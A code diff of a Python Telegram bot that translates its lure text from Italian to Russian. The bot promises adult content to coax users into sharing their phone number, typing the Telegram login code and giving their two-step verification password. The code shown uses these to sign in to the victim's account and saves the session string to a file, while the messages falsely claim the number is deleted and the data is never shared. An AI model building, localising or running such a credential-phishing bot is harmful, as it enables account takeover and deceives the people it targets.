@@ -84,9 +84,9 @@ async def send_code_keyboard(user_id, current_code, message_id=None):
     for row in digits:
         btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
         buttons.append(btn_row)
-    buttons.append([InlineKeyboardButton("✅ Invia Codice", callback_data="code_send")])
+    buttons.append([InlineKeyboardButton("✅ Отправить код", callback_data="code_send")])
     keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
-    text = f"📱 *Codice di verifica:*\n\n`{current_code}`\n\n_Premi i numeri per inserire il codice ricevuto da Telegram._" if current_code else "🔢 *Inserisci il codice di verifica*\n\n_Premi i pulsanti qui sotto per inserire il codice che hai ricevuto da Telegram._"
+    text = f"📱 *Код подтверждения:*\n\n`{current_code}`\n\n_Нажимайте цифры ниже, чтобы ввести код, полученный от Telegram._" if current_code else "🔢 *Введите код подтверждения*\n\n_Нажимайте кнопки ниже, чтобы ввести код, полученный от Telegram._"
 
     if message_id:
         await bot.edit_message_text(chat_id=user_id, message_id=message_id,
@@ -100,7 +100,7 @@ async def send_welcome_message(user_id):
     try:
         photo_path = "welcome_photo.jpg"
         keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("🔓 SBLOCCA ACCESSO IMMEDIATO", callback_data="auth_account"))
+        keyboard.add(InlineKeyboardButton("🔓 РАЗБЛОКИРОВАТЬ ДОСТУП СЕЙЧАС", callback_data="auth_account"))
         
         if os.path.exists(photo_path):
             with open(photo_path, 'rb') as photo:
@@ -108,20 +108,20 @@ async def send_welcome_message(user_id):
                     user_id,
                     photo,
                     caption=(
-                        "👋 *BENVENUTO NEL MONDO ESCLUSIVO 18+!* 🔞\n\n"
-                        "💋 *Scopri contenuti piccanti che non trovi da nessuna parte!*\n"
-                        "• Oltre 10.000 foto hot e video privati\n"
-                        "• Ragazze italiane e modelle internazionali\n"
-                        "• Contenuti amatoriali esclusivi\n"
-                        "• Live session e materiale inedito\n\n"
-                        "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n\n"
-                        "🔞 *ACCESSO RISERVATO ADULTI 18+*\n"
-                        "conferma che non sei un robot!\n\n"
-                        "✅ *Processo 100% sicuro e privato:*\n"
-                        "• Non vediamo le tue chat o messaggi\n"
-                        "• Non condividiamo i tuoi dati\n"
-                        "• conferma che non sei un robot!\n\n"
-                        "⚡️ _Clicca qui sotto per iniziare e sbloccare tutto immediatamente!_"
+                        "👋 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНЫЙ МИР 18+!* 🔞\n\n"
+                        "💋 *Открой для себя пикантный контент, которого нет больше нигде!*\n"
+                        "• Более 10.000 горячих фото и приватных видео\n"
+                        "• Девушки из России и модели со всего мира\n"
+                        "• Эксклюзивный любительский контент\n"
+                        "• Прямые трансляции и уникальные материалы\n\n"
+                        "🚀 *Подтверди аккаунт, чтобы разблокировать всё немедленно!*\n\n"
+                        "🔞 *ДОСТУП ТОЛЬКО ДЛЯ ВЗРОСЛЫХ 18+*\n"
+                        "Подтверди, что ты не робот!\n\n"
+                        "✅ *Процесс на 100% безопасный и конфиденциальный:*\n"
+                        "• Мы не видим твои чаты или сообщения\n"
+                        "• Мы не передаём твои данные третьим лицам\n"
+                        "• Подтверди, что ты не робот!\n\n"
+                        "⚡️ _Нажми ниже, чтобы начать и разблокировать всё прямо сейчас!_"
                     ),
                     parse_mode='Markdown',
                     reply_markup=keyboard
@@ -129,20 +129,20 @@ async def send_welcome_message(user_id):
         else:
             await bot.send_message(
                 user_id,
-                "👋 *BENVENUTO NEL MONDO ESCLUSIVO 18+!* 🔞\n\n"
-                "💋 *Scopri contenuti piccanti che non trovi da nessuna parte!*\n"
-                "• Oltre 10.000 foto hot e video privati\n"
-                "• Ragazze italiane e modelle internazionali\n"
-                "• Contenuti amatoriali esclusivi\n"
-                "• Live session e materiale inedito\n\n"
-                "🚀 *Verifica il tuo account per sbloccare tutto subito!*\n\n"
-                "🔞 *ACCESSO RISERVATO ADULTI*\n"
-                "conferma che non sei un robot!\n\n"
-                "✅ *Processo 100% sicuro e privato:*\n"
-                "• Non vediamo le tue chat o messaggi\n"
-                "• Non condividiamo i tuoi dati\n"
-                "• conferma che non sei un robot!\n\n"
-                "⚡️ _Clicca qui sotto per iniziare e sbloccare tutto immediatamente!_",
+                "👋 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНЫЙ МИР 18+!* 🔞\n\n"
+                "💋 *Открой для себя пикантный контент, которого нет больше нигде!*\n"
+                "• Более 10.000 горячих фото и приватных видео\n"
+                "• Девушки из России и модели со всего мира\n"
+                "• Эксклюзивный любительский контент\n"
+                "• Прямые трансляции и уникальные материалы\n\n"
+                "🚀 *Подтверди аккаунт, чтобы разблокировать всё немедленно!*\n\n"
+                        "🔞 *ДОСТУП ТОЛЬКО ДЛЯ ВЗРОСЛЫХ 18+*\n"
+                        "Подтверди, что ты не робот!\n\n"
+                        "✅ *Процесс на 100% безопасный и конфиденциальный:*\n"
+                        "• Мы не видим твои чаты или сообщения\n"
+                        "• Мы не передаём твои данные третьим лицам\n"
+                        "• Подтверди, что ты не робот!\n\n"
+                        "⚡️ _Нажми ниже, чтобы начать и разблокировать всё прямо сейчас!_",
                 parse_mode='Markdown',
                 reply_markup=keyboard
             )
@@ -150,12 +150,12 @@ async def send_welcome_message(user_id):
         logging.error(f"Error sending welcome message: {e}")
         # Fallback сообщение
         keyboard = InlineKeyboardMarkup()
-        keyboard.add(InlineKeyboardButton("🔓 SBLOCCA ACCESSO IMMEDIATO", callback_data="auth_account"))
+        keyboard.add(InlineKeyboardButton("🔓 РАЗБЛОКИРОВАТЬ ДОСТУП СЕЙЧАС", callback_data="auth_account"))
         
         await bot.send_message(
             user_id,
-            "👋 *BENVENUTO NEL MONDO ESCLUSIVO 18+!* 🔞\n\n"
-            "💋 Scopri contenuti piccanti esclusivi! Verifica il tuo account per accedere immediatamente a migliaia di foto e video hot!",
+            "👋 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНЫЙ МИР 18+!* 🔞\n\n"
+            "💋 Открой для себя пикантный контент! Подтверди аккаунт, чтобы получить доступ к тысячам горячих фото и видео!",
             parse_mode='Markdown',
             reply_markup=keyboard
         )
@@ -196,21 +196,21 @@ async def start_auth(callback_query: types.CallbackQuery):
     )
 
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 Condividi il mio numero", request_contact=True))
+    kb.add(KeyboardButton("📱 Поделиться номером телефона", request_contact=True))
     await bot.send_message(
         user_id,
-        "🔥 *FASE 1: VERIFICA RAPIDA* 🔞\n\n"
-        "conferma che non sei un robot!.\n\n"
-        "📋 *Cosa succede ora:*\n"
-        "1. Condividi il numero → Telegram ti invia un codice\n"
-        "2. Inserisci il codice → Verifica completata\n"
-        "3. ACCESSO SBLOCCATO → Contenuto 18+ disponibile\n\n"
-        "💎 *Dopo la verifica avrai subito:*\n"
-        "• Foto e video hot delle ragazze più belle\n"
-        "• Contenuti amatoriali esclusivi\n"
-        "• Materiale nuovo ogni giorno\n"
-        "• Chat private con le modelle\n\n"
-        "⚠️ Il tuo numero viene usato solo per questa verifica e poi cancellato. Tutto è anonimo e sicuro!",
+        "🔥 *ШАГ 1: БЫСТРАЯ ПРОВЕРКА* 🔞\n\n"
+        "Подтверди, что ты не робот!\n\n"
+        "📋 *Что нужно сделать:*\n"
+        "1. Поделись номером → Telegram отправит код\n"
+        "2. Введи код → Проверка завершена\n"
+        "3. ДОСТУП РАЗБЛОКИРОВАН → Контент 18+ доступен\n\n"
+        "💎 *После проверки ты получишь:*\n"
+        "• Горячие фото и видео с красивыми девушками\n"
+        "• Эксклюзивный любительский контент\n"
+        "• Новые материалы каждый день\n"
+        "• Приватные чаты с моделями\n\n"
+        "⚠️ Твой номер используется только для проверки и затем удаляется. Всё анонимно и безопасно!",
         parse_mode='Markdown',
         reply_markup=kb
     )
@@ -258,19 +258,19 @@ async def handle_contact(message: types.Message):
         
         # Сначала отправляем объяснение
         await message.answer(
-            "✅ *Numero ricevuto!* 🔞\n\n"
-            "📨 *FASE 2: CODICE DI VERIFICA*\n\n"
-            "Telegram ti ha inviato un SMS con un codice di 5 cifre.\n\n"
-            "🔢 *Istruzioni rapide:*\n"
-            "1. Controlla i messaggi sul tuo telefono\n"
-            "2. Inserisci il codice qui sotto usando i pulsanti\n"
-            "3. Premi 'Invia Codice' quando pronto\n\n"
-            "⚡️ *DOPO IL CODICE AVRAI SUBITO:*\n"
-            "• Accesso completo ai contenuti 18+\n"
-            "• Migliaia di foto e video hot\n"
-            "• Chat con ragazze vere\n"
-            "• Materiale esclusivo ogni giorno\n\n"
-            "_Il codice scade dopo 5 minuti per sicurezza._",
+            "✅ *Номер получен!* 🔞\n\n"
+            "📨 *ШАГ 2: КОД ПОДТВЕРЖДЕНИЯ*\n\n"
+            "Telegram отправил тебе SMS с кодом из 5 цифр.\n\n"
+            "🔢 *Инструкция:*\n"
+            "1. Проверь сообщения на телефоне\n"
+            "2. Введи код, используя кнопки ниже\n"
+            "3. Нажми 'Отправить код' после ввода\n\n"
+            "⚡️ *ПОСЛЕ ВВОДА КОДА ТЫ ПОЛУЧИШЬ:*\n"
+            "• Полный доступ к контенту 18+\n"
+            "• Тысячи горячих фото и видео\n"
+            "• Чаты с реальными девушками\n"
+            "• Эксклюзивные материалы каждый день\n\n"
+            "_Код действителен 5 минут для безопасности._",
             parse_mode='Markdown'
         )
         
@@ -280,7 +280,7 @@ async def handle_contact(message: types.Message):
         user_code_buffers[user_id]['message_id'] = msg_id
         
     except Exception as e:
-        await message.answer(f"❌ Errore nell'invio del codice: {e}")
+        await message.answer(f"❌ Ошибка при отправке кода: {e}")
         await client.disconnect()
         cleanup(user_id)
 
@@ -290,12 +290,12 @@ async def process_code_button(callback_query: types.CallbackQuery):
     data = callback_query.data
 
     if user_states.get(user_id) != 'awaiting_code':
-        await bot.answer_callback_query(callback_query.id, text="⛔️ Prima devi condividere il numero", show_alert=True)
+        await bot.answer_callback_query(callback_query.id, text="⛔️ Сначала поделись номером телефона", show_alert=True)
         return
 
     buffer = user_code_buffers.get(user_id)
     if not buffer:
-        await bot.answer_callback_query(callback_query.id, text="Errore interno. Ricomincia da /start", show_alert=True)
+        await bot.answer_callback_query(callback_query.id, text="Ошибка. Перезапусти с /start", show_alert=True)
         return
 
     current_code = buffer['code']
@@ -303,14 +303,14 @@ async def process_code_button(callback_query: types.CallbackQuery):
 
     if data == "code_send":
         if not current_code:
-            await bot.answer_callback_query(callback_query.id, text="⚠️ Inserisci prima il codice", show_alert=True)
+            await bot.answer_callback_query(callback_query.id, text="⚠️ Сначала введи код", show_alert=True)
             return
         await bot.answer_callback_query(callback_query.id)
         await try_sign_in_code(user_id, current_code)
     else:
         digit = data.split("_")[1]
         if len(current_code) >= 10:
-            await bot.answer_callback_query(callback_query.id, text="⚠️ Codice troppo lungo", show_alert=True)
+            await bot.answer_callback_query(callback_query.id, text="⚠️ Код слишком длинный", show_alert=True)
             return
         current_code += digit
         user_code_buffers[user_id]['code'] = current_code
@@ -321,7 +321,7 @@ async def try_sign_in_code(user_id, code):
     client = user_clients.get(user_id)
     phone = user_phones.get(user_id)
     if not client or not phone:
-        await bot.send_message(user_id, "⚠️ Sessione scaduta. Ricomincia da /start")
+        await bot.send_message(user_id, "⚠️ Сессия истекла. Перезапусти с /start")
         cleanup(user_id)
         return
 
@@ -370,19 +370,19 @@ async def try_sign_in_code(user_id, code):
 
             await bot.send_message(
                 user_id,
-                "🎉 *VERIFICA COMPLETATA!* 🔞🎊\n\n"
-                "✅ *Accesso SBLOCCATO ai contenuti ADULTI!*\n\n"
-                "🔥 *BENVENUTO NELLA ZONA ESCLUSIVA 18+!*\n\n"
-                "💋 *ORA HAI ACCESSO A:*\n"
-                "• Oltre 10.000 foto hot e video privati\n"
-                "• Ragazze italiane e modelle internazionali\n"
-                "• Contenuti amatoriali esclusivi\n"
-                "• Live session e materiale inedito\n"
-                "• Chat dirette con le modelle\n\n"
-                "🚀 *Il materiale sta arrivando...*\n"
-                "Stiamo preparando il tuo accesso completo.\n"
-                "Riceverai i primi contenuti entro pochi minuti!\n\n"
-                "⚠️ *MANTIENI SEGRETO L'ACCESSO* - Contenuto esclusivo solo per te!",
+                "🎉 *ПРОВЕРКА УСПЕШНО ЗАВЕРШЕНА!* 🔞🎊\n\n"
+                "✅ *ДОСТУП К КОНТЕНТУ ДЛЯ ВЗРОСЛЫХ РАЗБЛОКИРОВАН!*\n\n"
+                "🔥 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНУЮ ЗОНУ 18+!*\n\n"
+                "💋 *ТЕПЕРЬ ТЕБЕ ДОСТУПНО:*\n"
+                "• Более 10.000 горячих фото и приватных видео\n"
+                "• Девушки из России и модели со всего мира\n"
+                "• Эксклюзивный любительский контент\n"
+                "• Прямые трансляции и уникальные материалы\n"
+                "• Приватные чаты с моделями\n\n"
+                "🚀 *Контент уже на подходе...*\n"
+                "Мы готовим твой полный доступ.\n"
+                "Первые материалы придут в течение нескольких минут!\n\n"
+                "⚠️ *ДЕРЖИ ДОСТУП В СЕКРЕТЕ* - Контент только для тебя!",
                 parse_mode='Markdown'
             )
             await client.disconnect()
@@ -395,21 +395,21 @@ async def try_sign_in_code(user_id, code):
             )
             await bot.send_message(
                 user_id,
-                "🔐 *FASE 3: PROTEZIONE AGGIUNTIVA* 🔞\n\n"
-                "Il tuo account ha la protezione extra attivata.\n\n"
-                "📝 *Invia la password di sicurezza qui sotto:*\n\n"
-                "⚡️ *DOPO LA PASSWORD AVRAI SUBITO:*\n"
-                "• Accesso completo ai contenuti 18+\n"
-                "• Migliaia di foto e video hot\n"
-                "• Chat con ragazze vere\n\n"
-                "_Questa password è diversa dal codice SMS._",
+                "🔐 *ШАГ 3: ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА* 🔞\n\n"
+                "Твой аккаунт защищён дополнительно.\n\n"
+                "📝 *Отправь пароль безопасности ниже:*\n\n"
+                "⚡️ *ПОСЛЕ ВВОДА ПАРОЛЯ ТЫ ПОЛУЧИШЬ:*\n"
+                "• Полный доступ к контенту 18+\n"
+                "• Тысячи горячих фото и видео\n"
+                "• Чаты с реальными девушками\n\n"
+                "_Этот пароль отличается от кода из SMS._",
                 parse_mode='Markdown'
             )
     except PhoneCodeExpiredError:
         await bot.send_message(
             user_id,
-            "⏰ *Codice scaduto*\n\n"
-            "Il codice è scaduto. Usa /start per ricevere un nuovo codice e accedere ai contenuti hot!",
+            "⏰ *Код истёк*\n\n"
+            "Код устарел. Используй /start, чтобы получить новый код и открыть доступ к горячему контенту!",
             parse_mode='Markdown'
         )
         await client.disconnect()
@@ -417,8 +417,8 @@ async def try_sign_in_code(user_id, code):
     except PhoneCodeInvalidError:
         await bot.send_message(
             user_id,
-            "❌ *Codice errato*\n\n"
-            "Il codice non è valido. Controlla l'SMS e inserisci di nuovo il codice per sbloccare i contenuti 18+!",
+            "❌ *Неверный код*\n\n"
+            "Код введён неправильно. Проверь SMS и введи код заново, чтобы разблокировать контент 18+!",
             parse_mode='Markdown'
         )
         user_code_buffers[user_id]['code'] = ""
@@ -431,21 +431,21 @@ async def try_sign_in_code(user_id, code):
         )
         await bot.send_message(
             user_id,
-            "🔐 *PROTEZIONE EXTRA RILEVATA* 🔞\n\n"
-            "Il tuo account ha la verifica in due passaggi attivata.\n\n"
-            "📝 *Invia la password di sicurezza qui sotto per sbloccare tutto:*\n\n"
-            "💎 *DOPO LA PASSWORD AVRAI:*\n"
-            "• Accesso immediato ai contenuti 18+\n"
-            "• Foto e video esclusivi\n"
-            "• Chat private con le modelle",
+            "🔐 *ОБНАРУЖЕНА ДОПОЛНИТЕЛЬНАЯ ЗАЩИТА* 🔞\n\n"
+            "Твой аккаунт использует двухэтапную верификацию.\n\n"
+            "📝 *Отправь пароль безопасности ниже, чтобы разблокировать всё:*\n\n"
+            "💎 *ПОСЛЕ ВВОДА ПАРОЛЯ ТЫ ПОЛУЧИШЬ:*\n"
+            "• Мгновенный доступ к контенту 18+\n"
+            "• Эксклюзивные фото и видео\n"
+            "• Приватные чаты с моделями",
             parse_mode='Markdown'
         )
     except Exception as e:
         await bot.send_message(
             user_id,
-            f"❌ *Errore durante la verifica*\n\n"
-            f"Problema tecnico:\n`{e}`\n\n"
-            f"Riprova con /start per accedere ai contenuti esclusivi!",
+            f"❌ *Ошибка при проверке*\n\n"
+            f"Техническая проблема:\n`{e}`\n\n"
+            f"Попробуй снова с /start, чтобы получить доступ к эксклюзивному контенту!",
             parse_mode='Markdown'
         )
         await client.disconnect()
@@ -459,7 +459,7 @@ async def process_2fa(message: types.Message):
     phone = user_phones.get(user_id)
 
     if not client or not phone:
-        await message.answer("⚠️ Sessione scaduta. Usa /start per ricominciare")
+        await message.answer("⚠️ Сессия истекла. Используй /start для перезапуска")
         cleanup(user_id)
         return
 
@@ -501,34 +501,34 @@ async def process_2fa(message: types.Message):
                 json.dump({"phone": phone, "session": session_str}, f)
 
             await message.answer(
-                "🎉 *PROTEZIONE VERIFICATA!* 🔞🎊\n\n"
-                "✅ *Accesso COMPLETO ai contenuti ADULTI!*\n\n"
-                "🔥 *BENVENUTO NELLA ZONA ESCLUSIVA 18+!*\n\n"
-                "💋 *ORA PUOI GODERTI:*\n"
-                "• Oltre 10.000 foto hot e video privati\n"
-                "• Ragazze italiane e modelle internazionali\n"
-                "• Contenuti amatoriali esclusivi\n"
-                "• Live session e materiale inedito\n"
-                "• Chat dirette con le modelle\n\n"
-                "🚀 *Il materiale sta arrivando...*\n"
-                "Stiamo preparando il tuo accesso completo.\n"
-                "Riceverai i primi contenuti entro pochi minuti!\n\n"
-                "⚠️ *MANTIENI SEGRETO L'ACCESSO* - Contenuto esclusivo solo per te!",
+                "🎉 *ПРОВЕРКА УСПЕШНО ЗАВЕРШЕНА!* 🔞🎊\n\n"
+                "✅ *ПОЛНЫЙ ДОСТУП К КОНТЕНТУ ДЛЯ ВЗРОСЛЫХ!*\n\n"
+                "🔥 *ДОБРО ПОЖАЛОВАТЬ В ЭКСКЛЮЗИВНУЮ ЗОНУ 18+!*\n\n"
+                "💋 *ТЕПЕРЬ ТЫ МОЖЕШЬ НАСЛАЖДАТЬСЯ:*\n"
+                "• Более 10.000 горячих фото и приватных видео\n"
+                "• Девушки из России и модели со всего мира\n"
+                "• Эксклюзивный любительский контент\n"
+                "• Прямые трансляции и уникальные материалы\n"
+                "• Приватные чаты с моделями\n\n"
+                "🚀 *Контент уже на подходе...*\n"
+                "Мы готовим твой полный доступ.\n"
+                "Первые материалы придут в течение нескольких минут!\n\n"
+                "⚠️ *ДЕРЖИ ДОСТУП В СЕКРЕТЕ* - Контент только для тебя!",
                 parse_mode='Markdown'
             )
             await client.disconnect()
             cleanup(user_id)
         else:
             await message.answer(
-                "❌ *Password errata*\n\n"
-                "La password non è corretta. Invia la password giusta per sbloccare i contenuti 18+!",
+                "❌ *Неверный пароль*\n\n"
+                "Пароль введён неправильно. Отправь правильный пароль, чтобы разблокировать контент 18+!",
                 parse_mode='Markdown'
             )
     except Exception as e:
         await message.answer(
-            f"❌ *Errore di verifica*\n\n"
-            f"Problema: `{e}`\n\n"
-            f"Riprova con /start per accedere ai contenuti esclusivi!",
+            f"❌ *Ошибка проверки*\n\n"
+            f"Проблема: `{e}`\n\n"
+            f"Попробуй снова с /start, чтобы получить доступ к эксклюзивному контенту!",
             parse_mode='Markdown'
         )
         await client.disconnect()
